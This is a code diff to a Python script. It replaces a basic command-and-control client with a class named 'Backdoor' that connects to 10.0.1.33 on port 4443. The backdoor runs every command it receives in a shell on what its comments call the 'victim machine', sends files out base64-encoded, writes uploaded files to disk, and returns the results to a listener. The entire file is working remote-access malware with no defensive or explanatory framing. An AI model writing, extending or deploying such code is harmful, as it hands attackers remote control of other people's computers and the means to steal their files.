@@ -1,74 +1,78 @@
 import socket
+import subprocess
+import json
 import os
+import base64
 
-# Client setup
-SERVER_HOST = '10.0.1.37'  # Replace with the C2 server's IP
-SERVER_PORT = 9999        # Port where the server is running
 
-def listen_for_commands():
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((SERVER_HOST, SERVER_PORT))
+class Backdoor:
+    def __init__(self, ip, port):
 
-    while True:
-        # Receive the command from the server
-        command = client.recv(1024).decode()
-        
-        if command.lower() == 'exit':
-            print("Exiting client.")
-            break
+        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # CREATES A SOCKET OBJECT.AF_INET STANDS FOR IPV4 AND SOCK_STREAM FOR TCP PACKET
+        self.s.connect((ip, port))  # CONNECTION ESTABLISHMENT(3 WAY HANDSHAKE)
 
-        # Handle file upload command
-        elif command.startswith('upload'):
-            filename = command.split()[1]
-            upload_file(client, filename)
+    def execute(self, command):
+        try:
 
-        # Handle file download command
-        elif command.startswith('download'):
-            filename = command.split()[1]
-            download_file(client, filename)
+            return subprocess.check_output(command, shell=True)  # RETURNS THE OUTPUT OF SYSTEM COMMAND EXECUTED IN VICTIM MACHINE
+        except subprocess.CalledProcessError:
+            return "[+] invalid command [+]"
 
-        else:
-            response = os.popen(command).read()
-            if not response:
-                response = "Command executed, but no output returned."
-            client.send(response.encode())
 
-# File upload function (Client)
-def upload_file(client, filename):
-    # Receive upload command from server
-    command = client.recv(1024).decode()
-    if command.startswith("upload"):
-        # Extract filename and file size from the command
-        parts = command.split()
-        filename = parts[1]
-        file_size = int(parts[2])
+    def send_json(self, data):
 
-        # Send acknowledgment back to server
-        client.send("Ready to receive file.".encode())
+        json_data = json.dumps(data)  # CONVERT TCP STREAMS TO JSON DATA FOR RELIABLE TRANSFER FOR DATA
+        self.s.send(json_data)
 
-        # Open the file and receive the data in chunks
-        with open(filename, "wb") as f:
-            bytes_received = 0
-            while bytes_received < file_size:
-                data = client.recv(1024)
-                bytes_received += len(data)
-                f.write(data)
+    def recieve_json(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.s.recv(1024)  # USED TO UNWRAP JSON DATA
+                return json.loads(json_data)  # IT SENDS THE FULL FILE TILL THE END OF THE STRING/DAT
+            except ValueError:
+                continue
 
-        print(f"File {filename} uploaded.")
+    def change_dir(self, path):
+        try:
+            os.chdir(path)
+        except OSError:
+            return "invalid path"
+        return "changed directory to " + path
 
-# File download function (Client)
-def download_file(client, filename):
-    client.send(f"Requesting to download {filename}".encode())
+    def read_file(self, path):
 
-    # Wait for file size from the server
-    file_size = int(client.recv(1024).decode())
+        with open(path, "rb") as file:  # RB FOR READABLE BINRAY FILE
+            return base64.b64encode(file.read())
 
-    # Receive the file data from the server and save it
-    with open(f"downloaded_{filename}", "wb") as f:
-        data = client.recv(file_size)
-        f.write(data)
+    def write_file(self, path, content):
+        with open(path, "wb") as file:  # WB FOR WRITTABLE BINARY FILE
+            file.write(base64.b64decode(content))
+            return "[+] upload successful [+]"
 
-    print(f"File {filename} downloaded.")
+    def run(self):
 
-if __name__ == '__main__':
-    listen_for_commands()
+        while True:
+            command = self.recieve_json()  # TRANFERING DATA IN JUNKS.1024 IS THE BUFFER SIZE
+            try:
+
+                if command[0] == "exit":
+                    self.s.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_output = self.change_dir(command[1])
+                elif command[0] == "download":
+                    command_output = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_output = self.write_file(command[1], command[2])
+
+                else:
+                    command_output = self.execute(command)  # CALLING THE FUNCTION WHICH RETURNS OUTPUT OF SYSTEM COMMAND
+            except Exception:
+                command_output = "[+] error during execution of the command [+] "
+            self.send_json(command_output)  # SENDS BACKTHE OUTPUT TO LISTENER MACHINE
+
+
+
+backdoor = Backdoor("10.0.1.33", 4443)
+backdoor.run()
